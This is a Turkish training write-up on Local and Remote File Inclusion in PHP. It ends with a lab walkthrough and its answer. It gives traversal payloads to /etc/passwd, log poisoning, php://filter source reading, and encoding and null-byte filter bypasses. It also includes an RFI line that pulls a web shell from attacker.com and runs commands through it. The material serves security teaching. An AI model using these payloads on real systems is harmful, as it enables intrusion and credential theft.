# File Inclusion (LFI/RFI)

Eğitim Özeti
"File Inclusion (LFI/RFI)" eğitimi, web uygulamalarında yerel ve uzak dosya dahil etme zafiyetlerini tespit etmek ve bu zafiyetlere karşı korunma yöntemlerini öğretmeyi amaçlamaktadır. Bu kapsamlı eğitim, LFI (Local File Inclusion) ve RFI (Remote File Inclusion) zafiyetlerinin temel prensiplerini ve çeşitli saldırı tekniklerini detaylı bir şekilde ele alır.

Eğitim içeriğinde, LFI ve RFI zafiyetlerinin nasıl çalıştığını ve bu tür saldırıların nasıl gerçekleştirildiğini pratik örneklerle göstereceğiz. LFI zafiyetlerini tespit etme ve bu zafiyetleri istismar teknikleri üzerinde duracağız. Ayrıca, RFI saldırılarının nasıl yapıldığını inceleyeceğiz.

## 🛡️ Local File Inclusion (LFI) Essentials

LFI, bir web uygulamasının kullanıcıdan gelen dosya yolu girdilerini yetersiz doğrulaması sonucu ortaya çıkan kritik bir zafiyettir. Saldırganın sunucu üzerindeki yerel dosyaları (konfigürasyonlar, şifreler, loglar) okumasına olanak tanır.

![alt text](<Ekran görüntüsü 2026-03-14 021132.png>)

# 📂 LFI Operasyonu: Dizinlerin Derinliğine Yolculuk

Bir web uygulaması düşünün; kullanıcıya duvarda asılı duran tabloları (sayfaları) gösteriyor. Ancak saldırgan, tablonun çerçevesinden sızıp duvarın arkasındaki gizli kasaya (sistem dosyalarına) ulaşmak istiyor. İşte Local File Inclusion (LFI) tam olarak bu "çerçeve sızıntısıdır".

🎭 Senaryo:

Yazılımcımız, sistemin sadece kendi belirlediği dosyaları açacağını varsayarak kapıyı aralık bırakıyor:

&lt;?php

    $file = $_GET[&#39;page&#39;];
    include($file);

?&gt;

Buradaki akademik hata şudur: Girdi Doğrulama Eksikliği. Uygulama, $file değişkeninin içine ne koyulursa koyulsun onu "içeri buyur" ediyor.

🧗 Dizin Tırmanışı (Path Traversal)
Saldırganın elindeki en güçlü halat ../ ifadesidir. Bu ifade, sistemde "bir üst klasöre çık" demektir.

Hedef: /etc/passwd (Sistem kullanıcılarının listesi)
Mevcut Konum: /var/www/html/project/

Saldırgan, bulunduğu labirentten çıkmak için adeta bir dağcı gibi yukarı tırmanır:

../ -> /var/www/html/ (Bir adım yukarı)

../../ -> /var/www/ (İki adım yukarı)

../../../ -> /var/ (Üç adım yukarı)

../../../../ -> / (Kök Dizin - Zirve!)

Zirveye ulaştıktan sonra artık istediği kapıyı çalabilir:
site.com/index.php?page=../../../../etc/passwd

🕵️ Operasyonun İkinci Aşaması: "Sistemin Kara Kutusu"
LFI sadece bir dosya okuma açığı değildir; o, sunucunun hafızasına yapılan bir yolculuktur. Bir saldırgan kök dizine tırmandıktan sonra, sistemin kimliğini ve geçmişini öğrenmek için belirli kapıları çalar.

# 📜 1. Senaryo: Hassas Dosya Avı (Sensitve Files)

Saldırgan, sunucunun işletim sistemine göre bir yol haritası belirler. Burada amaç, sistemin röntgenini çekmektir.

### 🐧 Linux Cephesi:

Linux sistemlerde /etc/passwd bir klasiktir, ancak av bununla sınırlı kalmaz:

/etc/passwd: "Bu sistemde kimler yaşıyor?" sorusunun cevabıdır.

/etc/hosts: Sunucunun hangi iç ağlara veya diğer sunuculara bağlı olduğunu gösteren bir haritadır.

/var/log/apache2/access.log: Sunucunun kimlerle konuştuğunun günlüğüdür.

### 🪟 Windows Cephesi:

Windows dünyasında yollar ters (\) akar ve hedefler değişir:

C:\Windows\win.ini: Sistemin yapılandırma bilgilerini barındıran antika ama değerli bir dosyadır.

C:\Windows\System32\drivers\etc\hosts: Ağ yönlendirmelerinin gizli adres defteridir.

📝 2. Senaryo: Log Dosyaları ve Ayak İzleri
Web sunucuları (Apache, Nginx, IIS) her hareketi kaydeder. Bir saldırgan için log dosyalarına erişmek, sunucunun "Kara Kutusunu" ele geçirmektir.

Örnek Saldırı Vektörü:
http://example.com/index.php?page=../../../../var/log/apache2/access.log

Kritik Bilgi: Eğer bir saldırgan log dosyasına erişebiliyorsa, bir sonraki adımı Log Poisoning olacaktır. Yani kendi zararlı kodunu (User-Agent aracılığıyla) log dosyasına yazdırıp, sonra LFI ile o log dosyasını çağırarak kodunu sunucuda çalıştıracaktır.

## PHP Kod Enjeksiyonu (Log Poisoning)

🧪 Log Poisoning: Sistemin Günlüklerini Zehirlemek
LFI açığı olan bir sistemde sadece dosya okumakla yetinmeyen saldırgan, kendi kodunu sunucunun hafızasına (loglarına) enjekte ederek sistemin kalbine sızar. Bu yöntem, sunucunun tuttuğu kayıtları ona karşı kullanma sanatıdır.

### 💉 Adım 1: "Zehirli İstek" (Enjeksiyon)

Sunucular, kendilerine gelen her isteği ve kimden geldiğini (User-Agent) kaydeder. Saldırgan, kendisini bir tarayıcı gibi tanıtmak yerine, kimlik alanına bir PHP kodu gizler:

Aşağıda User-Agent alanına enjekte edilmiş PHP kodu bulunan bir HTTP isteği bulunuyor.

![alt text](<Ekran görüntüsü 2026-03-14 023058.png>)

Bu isteği gönderdikten sonra tarayıcıdan access.log dosyasını görüntüleyelim.

![alt text](<Ekran görüntüsü 2026-03-14 023137.png>)

Bu durumda, zararlı PHP kodu sunucu üzerinde çalıştırılır ve saldırgan sunucu dosya sistemindeki dosyaları listeleyebilir.

# PHP://filter ile Dosya Okuma

🎭 PHP Wrappers: Kaynak Kodun Perdesini Aralamak
LFI saldırılarında bazen bir dosyayı (config.php gibi) okumak istediğimizde, sunucu bu dosyayı ekrana basmak yerine çalıştırır. Bu durumda veritabanı şifrelerini göremeyiz, sadece boş bir sayfa ile karşılaşırız. İşte burada php://filter devre dışı bırakılamaz bir casus gibi devreye girer.

🔍 Teknik Mantık: "Yolda Paketleme"
Dosyayı olduğu gibi değil, yolda Base64 ile paketleyerek (encode) çağırırız. PHP, dosyayı "çalıştırılacak bir kod" olarak değil, "kodlanmış bir metin" olarak bize teslim eder.

🛠️ Operasyon Adımları

Dosyayı Base64 formatına çevirerek çağıran o meşhur payload:

Hedef: home.php dosyasının kaynak kodunu ele geçirmek
![alt text](<Ekran görüntüsü 2026-03-14 023330.png>)

Sunucu bize dosyanın içeriğini değil, onun Base64 ile zırhlanmış halini gönderir:

1. Payload Hazırlama

![alt text](<Ekran görüntüsü 2026-03-14 023336.png>)

2. Çıktıyı Alma (Encoded)

![alt text](<Ekran görüntüsü 2026-03-14 023340.png>)

3. Şifreyi Çözme (Decoding)

![alt text](<Ekran görüntüsü 2026-03-14 023343.png>)

Elimizdeki bu anlamsız metni terminale atıp orijinal haline döndürürüz:

4. Ele Geçirilen Kaynak Kod

Ve işte perdenin arkasındaki gerçek kod:

![alt text](<Ekran görüntüsü 2026-03-14 023346.png>)

# 🛡️ LFI Bypass: Filtrelerin Arkasından Dolanmak

Yazılımcılar bazen basit bir "bul ve sil" mantığıyla kapıyı kilitlediklerini sanırlar. Ancak siber güvenlikte "tek seferlik temizlik" her zaman bir yanılsamadır. Şimdi, en yaygın koruma mekanizmalarından birini nasıl "mat" edebileceğimizi inceleyelim.

## 🧩 1. Dizin Geçişi Filtreleri (Path Traversal Filters)

Bazı uygulamalar, saldırganın ../ kullanarak yukarı tırmanmasını engellemek için şu fonksiyonu kullanır:

![alt text](<Ekran görüntüsü 2026-03-14 030705.png>)

Buradaki akademik yanılgı şudur: Uygulama veriyi sadece bir kez tarar ve siler. Geriye kalan parçaların tekrar birleşip tehlike oluşturup oluşturmayacağını kontrol etmez.

## 🪜 Operasyon: Filtre Labirentini Aşmak (Bypass)

Güvenlik duvarları bazen sadece birer kağıttan kaplan gibidir. Yazılımcılar, tehlikeli gördükleri ../ ifadesini silen basit bir filtre yazdıklarında sistemin güvende olduğunu sanırlar. Ancak siber güvenlikte "tek geçişli temizlik" her zaman bir zaafiyettir.

### 🕵️ Senaryo: "Zararlı Hücre Bölünmesi"

Saldırgan, sistemin ../ gördüğü her yeri keseceğini bilir. Bu yüzden parçalandığında bile hedefteki yolu oluşturacak olan iç içe geçmiş (recursive-like) bir payload hazırlar.

🛠️ Uygulama Adımları:

1-)Payload Hazırlığı:

Saldırgan, her adım için ....// dizisini kullanır.

![alt text](<Ekran görüntüsü 2026-03-14 031005.png>)

2-)Filtreleme İşlemi (Perde Arkası):

Uygulama, payload içindeki gizli ../ kısımlarını (kırmızıyla işaretli alanı) yakalar ve siler:

.. ../ // 👉 Geriye kalan: ../

3-)Sonuç (Bypass Başarılı):

Filtre görevini tamamladığını sanıp dosyayı işleme aldığında, elimizde tertemiz bir yol haritası kalır:

![alt text](<Ekran görüntüsü 2026-03-14 031010.png>)

🎭 Neden Bypass Yapıyoruz? (Kısa & Öz Hikaye)
Bir kale düşün. Kalenin ana kapısı (Web Uygulaması) kilitli. Sen gizlice girmek istiyorsun ama kapıda bir "Dedektör" (Filtre) var. Bu dedektör, elinde "Merdiven" (../) olan herkesi durdurup merdivenine el koyuyor.

Senin Amacın: İçeriye o merdiveni sokup kralın odasına (Sistem Dosyalarına) tırmanmak.

Bypass Sanatı Burada Başlar:
Eğer merdiveni parçalara ayırıp, dedektörün "bu sadece bir odun parçası" diyeceği şekilde içeri sokarsan ve parçalar içeride kendiliğinden birleşip tekrar merdiven olursa, dedektörü aptal yerine koymuş olursun.

Özetle Bypass'ın Amacı:

Engeli Geçersiz Kılmak: Yazılımcının "güvendeyim" dediği noktada aslında güvende olmadığını kanıtlamak.

Erişilemeyene Erişmek: Normal şartlarda sistemin sana asla göstermeyeceği /etc/passwd gibi dosyaları zorla masaya yatırmak.

Zekâ Savaşı: Filtre sadece "neyi sileceğini" bilir, biz ise "silindikten sonra ne kalacağını" hesaplarız.

Siber_Security Notu: Bypass, bir kilidi kırmak değil; anahtar deliğinin içindeki mekanizmayı kandırmaktır. Bir siber güvenlik uzmanı için bypass yapabilmek, sistemin mantığını sistemden daha iyi anlamak demektir.

🕵️ Bypass: Biz mi Siliyoruz, Sunucu mu?
Aslında dizini (karakterleri) silen biz değiliz, sunucudaki o zayıf koruma filtresi.

Olayın Özeti:

Sunucu der ki: "Benim sistemimde ../ kullanmak yasak! Eğer gelen veride ../ görürsem onu anında silerim."

Biz (Saldırgan) deriz ki: "Tamam, sen sil. Ben öyle bir şey göndereceğim ki, sen sildiğinde geriye tam da benim istediğim şey kalacak."

🧩 Mekanizma: "Görünmez Birleşme"
Payload'u şöyle gönderiyoruz: ....//

Saldırganın Hamlesi: .. + ../ + / (İç içe geçmiş bir yapı).

Sunucunun Saf Hamlesi: Ortadaki ../ kısmını görür. "Hah! Bir tane yakaladım!" der ve onu siler.

Sonuç: Ortadaki parça gidince, baştaki .. ve sondaki / birbirine yapışır.

Bypass: Sunucu kendi eliyle bizim için tertemiz bir ../ (üst dizine çıkma komutu) üretmiş olur.

# Encoding (Kodlama): Dedektörlerden Kılık Değiştirerek Kaçmak

Bazen sunucunun güvenlik duvarı (WAF) çok "uyanık" olabilir. Girdi içinde nokta (.) veya bölü (/) gördüğü an alarmı çalar ve bizi kapı dışarı eder. Ancak bu dedektörlerin büyük bir zayıflığı vardır: Genelde sadece "açık metinleri" okumayı bilirler.

🧩 Teknik Mantık: "Görünmez Mürekkep"
Eğer kapıdaki görevli (filtre) "nokta" ve "bölü" karakterlerini yasakladıysa, biz de onlara başka bir dilde hitap ederiz: URL Encoding. Bu yöntemle karakterler, sunucu için hala geçerlidir ama filtreler için anlamsız birer yüzde (%) işaretinden ibarettir.

🕵️ Senaryo: "Karakterlerin Kamuflajı"
Saldırgan, yasaklı karakterleri ASCII tablosundaki onaltılık (hex) karşılıklarına çevirir.

. (Nokta) 👉 %2e

/ (Bölü) 👉 %2f

Böylece meşhur ../ ifademiz, dedektörlerin tanıyamayacağı şu şekle bürünür: %2e%2e%2f

🚀 Uygulamalı Payload (Operasyon URL'si)
Uygulama arka planda bu kodu çözdüğünde (decode ettiğinde) saldırı gerçekleşir:

# Hedef: /etc/passwd

https://example.com/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Bu şekilde, URL encoding ile kodlanmış LFI payloadımız, sunucu tarafındaki filtreyi aşarak dizin geçişi gerçekleştirir ve /etc/passwd dosyasını okuyabiliriz.

Not: URL encoding ve decoding işlemleri için kullanılabilecek birçok çevrimiçi site vardır, buralardan yararlanılabilir.

# 🏗️ Approved Paths (İzin Verilen Yollar): Truva Atı Tekniği

Bazı geliştiriciler, kapıyı tamamen kapatmak yerine bir "koridor" (Approved Path) belirler ve saldırganın sadece bu koridorda yürümesini zorunlu kılar. Bunu yapmak için de Regex (Düzenli İfadeler) kullanarak bir kontrol mekanizması kurarlar.

🧩 Teknik Engel: "Sadece Bu Kapıdan Gir!"
Uygulama, gelen verinin mutlaka belirli bir kelimeyle (örneğin ./languages/) başlamasını şart koşar:

![alt text](<Ekran görüntüsü 2026-03-14 040829.png>)

🕵️ Senaryo: "İzinli Bölgeden Kaçış"
Saldırgan, sistemin istediği "pasaportu" ona verir ama pasaportun arasına bir kaçış bileti gizler.

Saldırı Mantığı:

Zorunlu Başlangıç: Önce sistemin istediği ./languages/ kısmını yazarız (Böylece if kontrolünden geçeriz).

Geri Dönüş (Escape): Hemen ardından gelen ../ komutlarıyla, girdiğimiz o "izinli koridordan" hızla dışarı çıkarız.

🚀 Uygulamalı Payload
Sunucu bu yolu okuduğunda, önce languages klasörüne girer, sonra komutlarımızı takip ederek en tepeye tırmanır:

![alt text](<Ekran görüntüsü 2026-03-14 040940.png>)

Harika bir final! LFI serüvenimizin en "nostaljik" ama teknik açıdan en öğretici kısmına geldik. Null Byte, siber güvenlik dünyasında "kelimelerin bittiği yer" olarak bilinir. GitHub raporun için bu bölümü "Zaman Yolculuğu: Görünmez Sonlandırıcı" temasıyla hazırladım.

# 🕵️ Null Byte (%00) ve Double Encoding: Filtrelerin Ötesi

Bazen uygulama her şeyi doğru yaptığını sanır: Dizinleri kontrol eder, izinleri sorgular ve en son güvenlik önlemi olarak dosyanın sonuna zorla .php uzantısını ekler. Ama bir "boşluk" (null) her şeyi değiştirebilir.

🧩 4. Null Byte (%00): Cümleyi Yarım Bırakmak
Eski PHP sürümlerinde (v5.3.4 öncesi), sistem dosya yollarını işlerken C tabanlı kütüphaneler kullanırdı. C dilinde ise bir metnin bittiğini anlamak için Null Byte (\0) karakteri kullanılır.

🛠️ Senaryo: "Zoraki Uzantı"
Yazılımcı, güvenliği sağlamak için kodu şöyle yazar:

![alt text](<Ekran görüntüsü 2026-03-14 041033.png>)

Normal bir kullanıcı iletisim yazarsa, sistem iletisim.php dosyasını arar.

🚀 Saldırı Hamlesi (Bypass)
Saldırgan, sistemin sonuna ekleyeceği .php kısmından kurtulmak için payload'un sonuna %00 (Null Byte) ekler:

![alt text](<Ekran görüntüsü 2026-03-14 041120.png>)

# 🎭 5. Double Encoding (Çift Kodlama): Güvenlik Duvarını Uyutmak

Bazı gelişmiş sistemler, gelen verideki tek katmanlı URL kodlamasını (örneğin %2e) çözüp içeriğine bakacak kadar uyanıktır. Eğer içinde tehlikeli bir karakter (.) bulursa isteği engeller. Ancak biz, veriyi iki kez paketleyerek bu "akıllı" filtrelerin mantık hatasından faydalanabiliriz.

🧩 Teknik Mantık: "Kodun Kodunu Yazmak"
Buradaki kilit nokta, URL kodlamasında kullanılan % (yüzde) işaretinin kendisini de kodlamaktır.

Hedef Karakter: . (Nokta)

Tek Kodlama (Single Encode): %2e

Çift Kodlama (Double Encode): %252e (Burada % işareti %25 olarak kodlanmıştır).

🕵️ Senaryo: "Güvenlik Duvarının Yanılgısı"
Saldırgan, payload'unu çift katmanlı bir zırhla sarmalar:

# Hedef: /etc/passwd (Çift Kodlanmış)

https://example.com/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%65%74%63%252f%70%61%73%73%77%64

### Remote File Inclusion (RFI)

LFI zafiyetinde saldırgan sunucunun kendi dosyalarını ona karşı kullanırken, RFI zafiyetinde saldırgan dış dünyadan (kendi sunucusundan) bir dosyayı hedef sisteme "ithal" eder. Bu, kapıyı içeriden açmak yerine, dışarıdan bir Truva Atı sokmaya benzer.

🧩 RFI Saldırısının Anatomisi
Zafiyetin temelinde yine o meşhur, filtrelemeden yoksun PHP kodu yatar:

![alt text](<Ekran görüntüsü 2026-03-14 041431.png>)

LFI'dan farkı şudur: Uygulama sadece yerel dizinlere bakmakla kalmaz, HTTP/HTTPS protokolleri üzerinden gelen uzak bağlantıları da kabul eder.

## RFI Saldırıları ve Senaryoları

RFI, bir saldırganın kendi sunucusundaki bir dosyayı, sanki hedef sunucunun kendi dosyasıymış gibi sisteme "enjekte" etmesidir. Bu aşamada artık yerel dosyalarla uğraşmayız; doğrudan kendi yazdığımız zararlı yazılımı (malware) sisteme dahil ederiz.

🎭 Senaryo: "Dışarıdan Gelen Tehlike"
Saldırgan, internete açık bir sunucuda (attacker.com) basit ama ölümcül bir Web Shell hazırlar.

🛠️ 1. Adım: Zararlı Dosyanın Hazırlanması
Saldırgan, kendi sunucusuna shell.php (veya sunucu PHP değilse bile okunabilmesi için shell.txt) adında bir dosya yükler:

![alt text](<Ekran görüntüsü 2026-03-14 041628.png>)

🚀 2. Adım: Fitilin Ateşlenmesi (Payload Gönderimi)
Hedef sitenin zafiyetli parametresine, uzaktaki dosyanın tam adresi verilir:

# Hedef URL: Kendi sunucumuzdaki zehri hedef sisteme aşılıyoruz

https://example.com/index.php?page=https://attacker.com/shell.php

📈 3. Adım: Komut Çalıştırma (Execution)
Dosya sisteme dahil edildiği an, saldırgan artık URL üzerinden hedef sunucuya emirler yağdırabilir. Örneğin, sunucudaki tüm dosyaları listelemek için:

https://example.com/index.php?page=https://attacker.com/shell.php&cmd=ls -la

### Kimlik Bilgilerini Çalma

RFI zafiyetleri, saldırganların hedef sunucuda bulunan hassas dosyalara erişmesine ve bu dosyalardan kimlik bilgilerini çalmasına olanak tanır. Örneğin, config.php dosyasında bulunan veritabanı kullanıcı adı ve parolası gibi bilgiler çalınabilir.

### Örnek LAB

Basic Local File Inclusion

Bu laboratuvar, sistem içerisindeki yerel dosyalara izinsiz erişmeye yol açan Local File Inclusion(LFI) zafiyeti içerir.

Web uygulamasında karşınıza gelen 404 hata sayfasının içeriği, URL'de yer alan "page" parametresinde bulunan yoldan getirilmektedir. "page" parametresini değiştirerek, sistemdeki diğer dosyalara erişebilirsiniz.

"/etc/passwd" dosyasına eklenen son kullanıcının kullanıcı adı nedir?

Genel Bakış

Açılan laboratuvara ilk gittiğimizde bizi aşağıdaki sayfa karşılıyor.

![alt text](<Ekran görüntüsü 2026-03-14 041942.png>)

Görselde de görüldüğü üzere bizi 404 - Page Not Found sayfası karşılıyor. Sayfayı incelediğimizde URL'deki page parametresi dikkatimizi çekiyor. Bu parametre 404.php şeklinde bir değer alıyor.

Bu durumda aklımıza ilgili parametreyi manipüle ederek farklı dosyalara erişmek geliyor.

Zafiyetin Tespiti

Öncelikle zafiyetin varlığını tespit etmek için parametredeki değeri silerek uygulamanın nasıl tepki verdiğine bakalım.

![alt text](<Ekran görüntüsü 2026-03-14 042045-1.png>)

Evet gördüğünüz gibi parametreyi boş bıraktığımızda uygulama bize hata mesajı döndü. Hata mesajına baktığımızda ilgili dizinde index.php dosyasının bulunamadığını söylüyor.

Zafiyetin İstismar Edilmesi

Zafiyetin varlığını tespit ettik ve şimdi sırada bu zafiyeti kullanarak sistemdeki hassas dosyalara ulaşmak var.

Amacımız /etc/passwd dosyasına erişmek. Bunun için şu payloadı kullanacağız: ../../../../etc/passwd.

![alt text](<Ekran görüntüsü 2026-03-14 042305.png>)

Cevabımız: PİONEER
